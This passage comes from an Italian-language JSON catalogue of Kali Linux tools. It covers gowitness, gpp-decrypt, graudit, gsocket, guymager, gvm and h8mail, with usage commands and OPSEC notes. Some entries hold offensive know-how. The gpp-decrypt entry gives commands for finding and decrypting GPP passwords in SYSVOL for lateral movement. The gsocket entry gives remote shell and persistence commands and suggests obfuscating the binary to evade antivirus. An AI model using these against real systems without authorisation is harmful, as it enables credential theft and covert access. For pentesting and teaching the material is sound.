30\n\n# Specificando dimensioni viewport\ngowitness single https://target.com --resolution 1920x1080\n\n# Avvia web server per visualizzare risultati\ngowitness server\n# Poi naviga a http://localhost:7171\n\n# Export report\ngowitness report export --format html -o report.html\n\n# Pipeline con altri tool:\n# 1. Discovery con httpx\ncat hosts.txt | httpx -silent &gt; live_urls.txt\n# 2. Screenshot con gowitness\ngowitness file -f live_urls.txt\n# 3. Review nella gallery\ngowitness server</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Visual Reconnaissance</strong>, effettuare triage rapido di centinaia di web server identificando visivamente applicazioni interessanti, login page, dashboard e target prioritari per analisi approfondita.</p><p>Per <strong>Bug Bounty Scope Review</strong>, screenshottare tutti gli asset in scope per identificare rapidamente applicazioni custom, tecnologie riconoscibili e potenziali target di alto valore.</p><p>Per <strong>Asset Documentation</strong>, documentare la superficie web di un'organizzazione con screenshot datati per tracking delle modifiche nel tempo e report di assessment.</p><p>Per <strong>Penetration Test Reporting</strong>, includere screenshot delle applicazioni testate nel report finale per contestualizzare le vulnerabilità trovate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Reconnaissance:</strong> effettua connessioni HTTP/HTTPS a tutti i target per il rendering, generando traffico loggabile. User-Agent di Chrome è identificabile ma comune. Richiede Chrome/Chromium installato sul sistema. Considerare rate limiting per evitare ban su target sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "gpp-decrypt",
    "name": "gpp-decrypt",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gpp-decrypt/",
    "desc": "Decripta password cpassword da Group Policy Preferences (GPP) di Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Gpp-decrypt</strong> è un tool specializzato per decriptare password memorizzate nelle Group Policy Preferences (GPP) di Active Directory. Prima della patch MS14-025, gli amministratori potevano configurare password di account locali, mappature drive e task schedulati tramite GPP, con le password \"protette\" da cifratura AES-256. Il problema: Microsoft pubblicò la chiave AES nella documentazione MSDN, rendendo questa \"protezione\" completamente inutile. Qualsiasi utente di dominio può leggere SYSVOL e decriptare queste password. Nonostante la patch del 2014, ambienti legacy spesso contengono ancora GPP vulnerabili con password di local admin.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES-256 Decryption:</strong> decripta istantaneamente il campo cpassword usando la chiave AES pubblicata da Microsoft, rivelando la password in chiaro senza necessità di brute force o risorse computazionali.</p><p><strong>Simple CLI Input:</strong> accetta direttamente la stringa cpassword codificata in Base64 trovata nei file XML di GPP, senza necessità di preprocessing o estrazione manuale.</p><p><strong>Instant Results:</strong> la decryption è istantanea - non c'è cracking coinvolto, solo decifratura con chiave nota, restituendo immediatamente la password originale.</p><p><strong>Universal Compatibility:</strong> funziona con tutte le password GPP indipendentemente dalla complessità, lunghezza o caratteri speciali - la chiave è sempre la stessa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Decripta cpassword trovata in file GPP\ngpp-decrypt \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\"\n\n# Dove trovare cpassword - file XML in SYSVOL:\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\User\\Preferences\\Drives\\Drives.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Services\\Services.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\DataSources\\DataSources.xml\n\n# Cerca tutti i cpassword in SYSVOL da Windows\nfindstr /S /I cpassword \\\\dc01.domain.local\\sysvol\\*.xml\n\n# Da Linux con mount SMB\ngrep -r cpassword /mnt/sysvol/\n\n# Workflow automatizzato con PowerSploit\nImport-Module .\\PowerSploit.ps1\nGet-GPPPassword\n\n# Metasploit module\nuse post/windows/gather/credentials/gpp</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Active Directory Penetration Testing</strong>, dopo aver ottenuto accesso come utente di dominio, cercare password GPP è uno dei primi passi - spesso rivela password di local administrator identiche su molte macchine.</p><p>Per <strong>Privilege Escalation</strong>, le password GPP tipicamente configurano account local admin, permettendo escalation da domain user a local admin su workstation e server.</p><p>Per <strong>Lateral Movement</strong>, se la stessa password local admin è usata su più macchine (password reuse comune), una singola GPP decriptata può dare accesso a centinaia di sistemi.</p><p>Per <strong>Legacy Environment Assessment</strong>, verificare se ambienti non aggiornati o migrati da versioni precedenti di Windows contengono ancora GPP vulnerabili con password esposte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Patch Status:</strong> MS14-025 (maggio 2014) ha impedito la CREAZIONE di nuove GPP con password, ma NON rimuove quelle esistenti. Ambienti legacy, domini migrati da Windows 2003/2008 o con GPO mai pulite possono ancora contenere cpassword decriptabili. L'accesso a SYSVOL è consentito a tutti gli utenti di dominio autenticati - non richiede privilegi elevati. Tool come PowerSploit (Get-GPPPassword) automatizzano completamente la ricerca e decryption.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "graudit",
    "name": "graudit",
    "version": "3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/graudit/",
    "desc": "Static code analysis con grep per trovare vulnerabilità comuni nel codice sorgente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Graudit</strong> (grep rough audit) e uno strumento leggero di analisi statica del codice sorgente che utilizza grep e un database di signature per identificare pattern di codice potenzialmente vulnerabili. A differenza di tool SAST commerciali complessi che richiedono configurazioni elaborate e comprensione del flusso di esecuzione, Graudit adotta un approccio pragmatico basato sul pattern matching testuale, rendendolo estremamente veloce da eseguire e semplice da integrare in qualsiasi workflow di sviluppo. Il tool include database di signature per numerosi linguaggi di programmazione tra cui PHP, Python, Java, C/C++, JavaScript, Ruby e altri, ciascuno contenente espressioni regolari che identificano costrutti comunemente associati a vulnerabilita come SQL injection, cross-site scripting, command injection, path traversal e utilizzo di funzioni crittografiche deboli. Nonostante la semplicita dell'approccio, Graudit si rivela sorprendentemente efficace come primo filtro per identificare rapidamente le aree di codice che richiedono una review manuale approfondita.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Database di signature multi-linguaggio:</strong> Graudit fornisce database di pattern preconfigurati per i linguaggi piu diffusi, ciascuno contenente espressioni regolari mirate a identificare costrutti vulnerabili specifici del linguaggio. Per PHP include pattern per funzioni pericolose come eval(), system(), exec() e query SQL non parametrizzate. Per Python identifica l'uso di pickle su input non fidati, subprocess con shell=True e template injection. Ogni database e mantenuto come file di testo modificabile.</p><p><strong>Esecuzione leggera e senza dipendenze:</strong> Essendo basato interamente su grep e script shell, Graudit non richiede runtime specifici, parser AST o ambienti di compilazione. Puo essere eseguito su qualsiasi sistema Unix-like con una shell POSIX standard, rendendolo ideale per analisi rapide su server remoti, container Docker minimali o ambienti dove l'installazione di tool complessi non e praticabile. L'esecuzione su codebase di medie dimensioni richiede pochi secondi.</p><p><strong>Personalizzazione con signature custom:</strong> Gli utenti possono creare database di signature personalizzati per identificare pattern specifici della propria organizzazione, come l'uso di API interne deprecate, configurazioni di sicurezza errate o violazioni di coding standard. Questa flessibilita rende Graudit utile non solo per la ricerca di vulnerabilita ma anche per enforce di policy di sviluppo sicuro e conformita agli standard interni del team.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Graudit viene tipicamente eseguito sulla directory radice del progetto da analizzare, specificando il database di signature appropriato per il linguaggio predominante. I risultati vengono presentati in formato simile a grep con nome file, numero riga e contesto del match.</p><pre><code># Scansione di un progetto PHP con database specifico\ngraudit -d php /var/www/html/webapp/\n\n# Analisi di codice Python\ngraudit -d python /path/to/python/project/\n\n# Scansione con tutti i database disponibili\ngraudit -d all /path/to/mixed/codebase/\n\n# Lista dei database di signature disponibili\ngraudit -l\n\n# Scansione con database personalizzato\ngraudit -d /path/to/custom/signatures.db /path/to/code/\n\n# Output colorato con contesto aggiuntivo\ngraudit -d java -A 3 -B 3 /path/to/java/project/\n\n# Esclusione di directory specifiche\ngraudit -d php -x vendor -x node_modules /path/to/project/</code></pre><p>I risultati di Graudit richiedono sempre una review manuale per distinguere i veri positivi dai falsi allarmi. E consigliabile utilizzare l'output come punto di partenza per una revisione del codice piu approfondita, concentrando l'attenzione sulle aree segnalate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>code review e audit di sicurezza</strong>, Graudit fornisce un primo pass automatizzato che identifica rapidamente le aree di codice potenzialmente problematiche su cui concentrare la revisione manuale. Questo approccio triage permette di ottimizzare il tempo dell'auditor, che puo dedicare l'attenzione approfondita alle sezioni di codice effettivamente sospette piuttosto che leggere l'intero codebase sequenzialmente. In contesti di <strong>bug bounty su applicazioni open source</strong>, Graudit permette di analizzare rapidamente il codice sorgente disponibile pubblicamente per identificare pattern vulnerabili comuni, fornendo lead concreti su cui costruire exploit funzionanti. Per l'integrazione in <strong>pipeline DevSecOps leggere</strong>, Graudit puo essere aggiunto come step di scansione in pipeline CI/CD dove tool SAST piu pesanti non sono praticabili per vincoli di tempo o risorse, fornendo almeno un livello base di analisi automatizzata della sicurezza del codice.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Graudit opera esclusivamente in locale sui file sorgente e non genera alcun traffico di rete, rendendolo completamente invisibile a qualsiasi sistema di monitoraggio di rete. L'unica traccia della sua esecuzione e nei log di processo del sistema operativo e nell'accesso ai file del filesystem locale.</p><p><strong>Impatto operativo:</strong> Il tasso di falsi positivi puo essere significativo poiche il pattern matching testuale non comprende il contesto semantico del codice. Funzioni segnalate come pericolose potrebbero essere utilizzate in modo sicuro con input adeguatamente sanitizzati. I risultati richiedono sempre validazione manuale prima di essere considerati vulnerabilita confermate. Su codebase molto grandi, l'output puo essere voluminoso e difficile da gestire senza filtering aggiuntivo.</p><p><strong>Mitigazioni:</strong> Combinare i risultati di Graudit con tool SAST piu sofisticati che comprendono il flusso dei dati per ridurre i falsi positivi. Creare una allowlist per i pattern che sono stati verificati come sicuri nel contesto specifico dell'applicazione. Documentare i finding confermati separatamente dai potenziali falsi positivi per facilitare la comunicazione con il team di sviluppo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "gsocket",
    "name": "gsocket",
    "version": "1.4.43",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gsocket/",
    "desc": "Connessione diretta tra host dietro NAT/firewall senza port forwarding tramite relay.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Global Socket (GSocket)</strong> e una suite di strumenti di rete che consente di stabilire connessioni TCP dirette tra host che si trovano dietro NAT, firewall o CGNAT senza necessita di port forwarding, configurazioni del router o indirizzi IP pubblici. Il meccanismo si basa su un relay server globale che facilita il rendez-vous iniziale tra i due endpoint utilizzando un segreto condiviso, dopo il quale la comunicazione prosegue in modo cifrato end-to-end con AES-256. GSocket include diversi tool tra cui gs-netcat (sostituto di netcat con NAT traversal), gs-sftp per trasferimento file sicuro, gs-mount per montare filesystem remoti e blitz per condivisione file temporanea. La semplicita d'uso e notevole: due macchine qualsiasi nel mondo possono stabilire una connessione bidirezionale semplicemente condividendo lo stesso segreto, senza alcuna configurazione di rete. Questo lo rende uno strumento estremamente potente sia per usi legittimi di amministrazione remota sia per scenari di post-exploitation dove la persistenza dell'accesso e cruciale.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>NAT traversal trasparente con crittografia:</strong> GSocket permette a due host dietro NAT o firewall di stabilire una connessione diretta utilizzando un segreto condiviso come identificatore unico. Il relay server globale facilita solo l'handshake iniziale, dopo il quale la comunicazione e cifrata end-to-end con AES-256-CBC. Se possibile, il tool tenta di stabilire una connessione peer-to-peer diretta tramite UDP hole punching, utilizzando il relay solo come fallback per massimizzare performance e privacy.</p><p><strong>Shell remota e SSH tunneling:</strong> gs-netcat fornisce funzionalita di shell remota interattiva con supporto PTY completo, permettendo sessioni di terminale identiche a SSH senza necessita di porte aperte o servizi in ascolto. Supporta anche il forwarding di connessioni SSH attraverso il tunnel GSocket, consentendo di utilizzare tutte le funzionalita avanzate di SSH (port forwarding, SOCKS proxy, X11 forwarding) attraverso firewall restrittivi che normalmente bloccherebbero queste connessioni.</p><p><strong>Trasferimento file e port forwarding:</strong> La suite include gs-sftp per trasferimenti di file sicuri e gs-mount per montare filesystem remoti via FUSE, entrambi funzionanti attraverso NAT senza configurazione. Il port forwarding integrato permette di esporre servizi locali di un host remoto come se fossero disponibili localmente, abilitando scenari di pivoting avanzato durante penetration test dove l'accesso a reti interne e limitato da architetture di rete restrittive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo base di GSocket richiede solo un segreto condiviso tra i due endpoint. Il segreto puo essere generato automaticamente o specificato manualmente. Il listener e il connector non necessitano di conoscere gli indirizzi IP reciproci.</p><pre><code># Genera un segreto casuale\ngs-netcat -g\n# Output: ExAmPlEsEcReT123\n\n# Host A: avvia listener con shell interattiva\ngs-netcat -l -i -s ExAmPlEsEcReT123\n\n# Host B: connetti e ottieni shell remota\ngs-netcat -i -s ExAmPlEsEcReT123\n\n# Port forwarding: esponi porta remota 3306 localmente su 13306\ngs-netcat -l -s SECRET -p 13306:127.0.0.1:3306\ngs-netcat -s SECRET -p 13306:127.0.0.1:3306\n\n# Trasferimento file sicuro\ngs-sftp -s SECRET\n\n# Deploy persistente come servizio (autostart)\ngs-netcat -l -i -s SECRET -D\n\n# SSH attraverso GSocket tunnel\ngs-netcat -l -s SECRET -e /usr/sbin/sshd</code></pre><p>Il flag -D abilita la modalita daemon che installa GSocket come servizio persistente con autostart al boot, utile per mantenere accesso remoto permanente. In ambienti di produzione, e consigliabile utilizzare segreti lunghi e complessi generati crittograficamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In operazioni di <strong>Red Team e post-exploitation</strong>, GSocket fornisce un canale di accesso remoto persistente e resiliente che non richiede porte aperte sulla macchina compromessa, non appare nei risultati di scansione di porte e sopravvive ai cambiamenti di indirizzo IP. La comunicazione cifrata e il passaggio attraverso il relay server rendono difficile per i difensori identificare e bloccare il canale C2. Per <strong>amministrazione remota e troubleshooting</strong>, GSocket permette di accedere a sistemi dietro NAT complessi o CGNAT senza dover configurare VPN, port forwarding o servizi esposti su internet, riducendo significativamente la superficie di attacco rispetto all'apertura di porte nel firewall. In scenari di <strong>pivoting durante penetration test</strong>, il port forwarding di GSocket permette di raggiungere servizi su reti interne segmentate attraversando firewall e NAT multipli, utilizzando la macchina compromessa come relay senza necessita di tool aggiuntivi o configurazioni di rete complesse.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico verso il relay server GSocket (gs.thc.org) puo essere identificato e bloccato tramite blocco del dominio o dell'IP del relay. Soluzioni EDR possono rilevare l'installazione del servizio persistente e le connessioni in uscita verso il relay. Il binary di gs-netcat puo essere rilevato da antivirus e soluzioni di endpoint protection tramite firma o analisi comportamentale.</p><p><strong>Impatto operativo:</strong> La dipendenza dal relay server pubblico introduce un single point of failure: se il relay e irraggiungibile o bloccato, la connessione non puo essere stabilita. Le performance sono limitate dalla capacita del relay server e dalla latenza della connessione verso di esso. Il segreto condiviso, se compromesso, permetterebbe a terzi di impersonare uno degli endpoint.</p><p><strong>Mitigazioni:</strong> Deployare un relay server self-hosted per eliminare la dipendenza dall'infrastruttura pubblica e ridurre il rischio di monitoraggio da parte di terzi. Utilizzare segreti lunghi e unici per ogni connessione. Combinare con tecniche di offuscamento del binary per evitare detection basata su firma. Monitorare il relay per assicurarsi che la connessione non sia stata compromessa o intercettata.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "guymager",
    "name": "guymager",
    "version": "0.8.13",
    "icon": "../app/icons/guymager-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/guymager/",
    "desc": "GUI forense per acquisizione immagini disco con hashing, compressione e log chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Guymager</strong> e un applicativo forense con interfaccia grafica progettato specificamente per l'acquisizione di immagini disco in contesti di digital forensics e incident response. Lo strumento si distingue per le sue performance elevate grazie all'utilizzo di I/O asincrono e multi-threading, che gli permettono di saturare la banda di lettura dei dispositivi sorgente durante il processo di acquisizione. Guymager supporta i principali formati di immagine forense tra cui dd/raw (bit-for-bit copy), EWF/E01 (Expert Witness Format, standard EnCase) e AFF (Advanced Forensic Format), offrendo per ciascuno opzioni di compressione e segmentazione configurabili. Una caratteristica fondamentale e il calcolo parallelo di hash MD5 e SHA-256 durante l'acquisizione stessa, eliminando la necessita di un passaggio separato di verifica e risparmiando tempo prezioso durante le operazioni forensi. Il tool genera automaticamente log dettagliati che documentano ogni aspetto dell'acquisizione, fornendo la documentazione necessaria per la chain of custody richiesta in ambito giudiziario.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Acquisizione multi-formato con compressione:</strong> Guymager supporta la creazione di immagini nei formati dd (raw), EWF/E01 e AFF, ognuno con caratteristiche specifiche. Il formato EWF/E01, preferito in ambito forense per la sua compatibilita con EnCase e altri tool di analisi, supporta compressione integrata che riduce significativamente lo spazio di archiviazione necessario senza compromettere l'integrita dei dati. Il formato dd produce copie bit-for-bit perfette senza overhead ma senza compressione, mentre AFF offre un formato aperto con metadati estensibili.</p><p><strong>Hashing parallelo e verifica automatica:</strong> Durante l'acquisizione, Guymager calcola simultaneamente hash MD5 e SHA-256 del contenuto del disco sorgente sfruttando il multi-threading, senza impatto sulle performance di lettura. Al completamento dell'acquisizione, esegue automaticamente una fase di verifica ricalcolando gli hash sull'immagine creata e confrontandoli con quelli calcolati durante la lettura. Questa doppia verifica garantisce l'integrita forense dell'immagine e documenta che nessun dato e stato alterato durante il processo di copia.</p><p><strong>Generazione log per chain of custody:</strong> Al termine di ogni acquisizione, Guymager produce un file di log dettagliato contenente tutte le informazioni rilevanti per la chain of custody: identificazione del dispositivo sorgente (modello, seriale, capacita), hash di verifica, timestamp di inizio e fine acquisizione, nome dell'operatore, numero del caso e note aggiuntive. Questo log e essenziale per l'ammissibilita dell'evidenza digitale in procedimenti legali e per dimostrare che il processo di acquisizione ha seguito le best practice forensi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Guymager viene avviato con privilegi di root per accedere direttamente ai dispositivi a blocchi. L'interfaccia grafica mostra tutti i dispositivi di storage collegati al sistema con le relative informazioni identificative. E fondamentale utilizzare sempre un write blocker hardware tra il dispositivo sorgente e il sistema di acquisizione.</p><pre><code># Avvia Guymager con privilegi root\nsudo guymager\n\n# Nell'interfaccia grafica:\n# 1. Identifica il dispositivo sorgente nella lista\n# 2. Tasto destro sul dispositivo -> \"Acquire image\"\n# 3. Seleziona formato di output:\n#    - Expert Witness Format (E01) per compatibilita massima\n#    - dd raw per copia bit-for-bit senza overhead\n# 4. Compila i campi del caso:\n#    - Case number, Evidence number, Examiner\n#    - Description, Notes\n# 5. Specifica percorso e nome del file di destinazione\n# 6. Abilita calcolo hash MD5 + SHA-256\n# 7. Abilita verifica post-acquisizione\n# 8. Avvia acquisizione e monitora il progresso</code></pre><p>La velocita di acquisizione dipende dal dispositivo sorgente e dal supporto di destinazione. E consigliabile utilizzare dischi di destinazione veloci (SSD o RAID) per non creare colli di bottiglia. Il formato E01 con compressione puo ridurre lo spazio necessario del 30-50% per dischi non completamente pieni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel campo della <strong>digital forensics investigativa</strong>, Guymager e lo strumento di riferimento per l'acquisizione di evidenze digitali da hard disk, SSD, chiavette USB e schede di memoria durante indagini penali e civili. La combinazione di interfaccia intuitiva, hashing parallelo e generazione automatica di log di chain of custody lo rende ideale per operatori forensi che devono acquisire grandi volumi di dati in modo rapido e documentato. Durante operazioni di <strong>incident response</strong>, Guymager permette di creare rapidamente immagini forensi di sistemi potenzialmente compromessi per l'analisi successiva, preservando lo stato del disco al momento dell'acquisizione prima che qualsiasi operazione di remediation possa alterare le evidenze. Per attivita di <strong>eDiscovery e compliance</strong>, lo strumento fornisce un metodo documentato e verificabile per acquisire e preservare dati digitali rilevanti in contenziosi legali, assicurando che l'evidenza digitale sia raccolta seguendo procedure che ne garantiscono l'ammissibilita in tribunale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Guymager e un tool di acquisizione che opera in modalita di sola lettura sul dispositivo sorgente, pertanto non altera in alcun modo l'evidenza originale. L'utilizzo di un write blocker hardware e comunque fortemente raccomandato come garanzia aggiuntiva e per soddisfare i requisiti di best practice forensi riconosciuti dalla comunita internazionale.</p><p><strong>Impatto operativo:</strong> L'acquisizione di dischi di grandi dimensioni (1TB+) puo richiedere diverse ore, durante le quali il dispositivo sorgente deve rimanere collegato e stabile. Interruzioni durante l'acquisizione richiedono di ricominciare il processo dall'inizio. Lo spazio di archiviazione necessario per le immagini forensi puo essere considerevole, specialmente nel formato dd raw che produce immagini della stessa dimensione del disco sorgente.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre write blocker hardware certificati per prevenire scritture accidentali sul dispositivo sorgente. Verificare che lo spazio di destinazione sia sufficiente prima di avviare l'acquisizione. Documentare fotograficamente il setup di acquisizione includendo i dispositivi collegati e le condizioni operative. Conservare le immagini forensi in modo sicuro con controllo degli accessi e verifica periodica degli hash di integrita.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "gvm",
    "name": "gvm",
    "version": "25.04.0",
    "icon": "../app/icons/gvm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gvm/",
    "desc": "Greenbone Vulnerability Management, scanner di vulnerabilità enterprise open source.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GVM</strong> (Greenbone Vulnerability Management), precedentemente noto come OpenVAS, e la principale piattaforma open source per vulnerability assessment e gestione delle vulnerabilita a livello enterprise. Il framework integra uno scanner di rete potente alimentato da un database di oltre 50.000 Network Vulnerability Tests (NVT) costantemente aggiornati dalla community Greenbone, un sistema di gestione degli asset, funzionalita di scheduling per scansioni automatizzate e un motore di reporting completo. L'architettura modulare di GVM comprende diversi componenti: il Greenbone Security Assistant (GSA) come interfaccia web, il Greenbone Vulnerability Manager Daemon (gvmd) come orchestratore centrale, lo scanner OpenVAS come motore di test e ospd-openvas come controller dello scanner. GVM rappresenta l'alternativa open source piu matura a soluzioni commerciali come Nessus, Qualys e Rapid7, offrendo capacita comparabili per organizzazioni che necessitano di vulnerability management continuo senza i costi delle licenze enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Scanner di vulnerabilita con database NVT esteso:</strong> Il cuore di GVM e il suo scanner che esegue oltre 50.000 test di vulnerabilita contro i target specificati, coprendo vulnerabilita di sistema operativo, applicazioni web, servizi di rete, configurazioni errate e compliance a standard di sicurezza. Il database NVT viene aggiornato quotidianamente con nuove vulnerabilita (CVE) e test, garantendo che le scansioni rilevano anche le minacce piu recenti. Ogni vulnerabilita identificata include severity CVSS, descrizione dettagliata, riferimenti CVE e suggerimenti di remediation.</p><p><strong>Gestione asset e scansioni programmate:</strong> GVM mantiene un inventario centralizzato degli asset di rete, tracciando lo stato delle vulnerabilita di ogni host nel tempo. Il sistema di scheduling permette di configurare scansioni ricorrenti automatiche (giornaliere, settimanali, mensili) per garantire un monitoraggio continuo della postura di sicurezza. I risultati storici consentono di visualizzare trend di miglioramento o deterioramento della sicurezza complessiva dell'infrastruttura.</p><p><strong>Reporting e compliance:</strong> Il motore di reporting genera documenti dettagliati in formati multipli (PDF, HTML, CSV, XML) con classificazione delle vulnerabilita per severita, asset affetto e categoria. GVM include configurazioni di scansione predefinite per verificare la compliance a standard come PCI-DSS, HIPAA e CIS Benchmarks, generando report specifici che documentano lo stato di aderenza ai requisiti di sicurezza richiesti da auditor e regolatori.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'installazione e configurazione iniziale di GVM richiede diversi passaggi per il setup dei componenti, il download del database NVT e la generazione delle credenziali di accesso. Una volta configurato, la gestione avviene tramite l'interfaccia web Greenbone Security Assistant.</p><pre><code># Setup iniziale completo (puo richiedere 30+ minuti)\nsudo gvm-setup\n# Annotare la password admin generata\n\n# Avvio di tutti i servizi GVM\nsudo gvm-start\n\n# Verifica stato dei servizi\nsudo gvm-check-setup\n\n# Accesso all'interfaccia web\n# Aprire browser su https://localhost:9392\n# Login: admin / [password generata]\n\n# Workflow tipico nell'interfaccia web:\n# 1. Configuration -> Targets: definisci host da scansionare\n# 2. Scans -> Tasks: crea nuovo task di scansione\n# 3. Seleziona scan config (Full and fast, Discovery, etc.)\n# 4. Avvia scansione e monitora progresso\n# 5. Scans -> Reports: analizza risultati\n\n# Aggiornamento manuale dei feed NVT\nsudo greenbone-feed-sync</code></pre><p>La prima scansione dopo il setup puo essere lenta poiche il database NVT deve essere completamente caricato in memoria. Le scansioni successive beneficiano della cache e sono significativamente piu veloci. Per reti grandi, e consigliabile configurare scansioni segmentate per evitare sovraccarichi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability assessment aziendale continuo</strong>, GVM fornisce una piattaforma completa per monitorare lo stato di sicurezza dell'intera infrastruttura IT con scansioni programmate automatiche, dashboard di trend e report esecutivi. Le organizzazioni possono tracciare l'evoluzione delle vulnerabilita nel tempo, misurare i tempi di remediation e dimostrare il miglioramento continuo della postura di sicurezza ai management e agli stakeholder. In contesti di <strong>penetration testing e security assessment</strong>, GVM serve come strumento di ricognizione iniziale per identificare rapidamente vulnerabilita note sui target autorizzati, fornendo ai tester un quadro completo delle debolezze potenziali da investigare manualmente. I report dettagliati con riferimenti CVE e scoring CVSS aiutano a prioritizzare gli sforzi di exploitation. Per <strong>compliance e audit di sicurezza</strong>, le configurazioni di scansione predefinite per standard come PCI-DSS, CIS Benchmarks e DISA STIG permettono di verificare automaticamente l'aderenza ai requisiti di sicurezza obbligatori, generando documentazione pronta per gli auditor che dimostra le misure di controllo implementate e le eventuali non-conformita da risolvere.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni GVM generano un volume significativo di traffico di rete facilmente rilevabile da IDS/IPS, firewall e sistemi di monitoraggio. Le signature degli scanner OpenVAS sono note e incluse nelle regole di detection di Snort, Suricata e soluzioni SIEM commerciali. I target scansionati registrano numerosi tentativi di connessione e probe nei loro log di sistema e applicativi.</p><p><strong>Impatto operativo:</strong> Scansioni aggressive possono causare instabilita o crash di servizi vulnerabili, dispositivi embedded e sistemi legacy. Alcuni test di vulnerabilita eseguono check attivi che potrebbero triggerare lockout di account o alert di sicurezza. GVM richiede risorse hardware significative (minimo 4GB RAM, consigliati 8GB+) e il database PostgreSQL puo crescere considerevolmente nel tempo.</p><p><strong>Mitigazioni:</strong> Coordinare sempre le scansioni con il team operations e ottenere autorizzazione scritta prima di scansionare qualsiasi asset. Utilizzare profili di scansione appropriati al contesto, evitando check distruttivi su sistemi di produzione critici. Programmare le scansioni in finestre di manutenzione per minimizzare l'impatto sulle operazioni. Implementare esclusioni per dispositivi noti come fragili o critici per la produzione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "h8mail",
    "name": "h8mail",
    "version": "2.5.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/h8mail/",
    "desc": "Email OSINT tool per trovare password leakate in breach database e paste site.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>H8mail</strong> e uno strumento OSINT specializzato nella ricerca di credenziali compromesse associate a indirizzi email attraverso l'interrogazione di molteplici servizi di breach notification e database di data leak. Scritto in Python, il tool automatizza il processo di verifica della presenza di un indirizzo email in data breach noti, restituendo informazioni sulle password e altri dati sensibili eventualmente esposti. H8mail integra nativamente numerose API di servizi come HaveIBeenPwned (HIBP), Hunter.io, Snusbase, Leak-Lookup, WeLeakInfo e altri, permettendo di aggregare risultati da fonti multiple in un'unica ricerca. Lo strumento supporta sia la ricerca di singoli indirizzi email sia l'elaborazione in batch di liste contenenti migliaia di indirizzi, rendendolo efficace per valutazioni su larga scala della compromissione delle credenziali aziendali. I risultati possono essere esportati in formato CSV o JSON per elaborazione successiva e integrazione con altri strumenti di analisi. H8mail e particolarmente utile per team di sicurezza che necessitano di verificare rapidamente l'esposizione delle credenziali dei propri utenti a seguito di data breach pubblici.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Interrogazione multi-sorgente 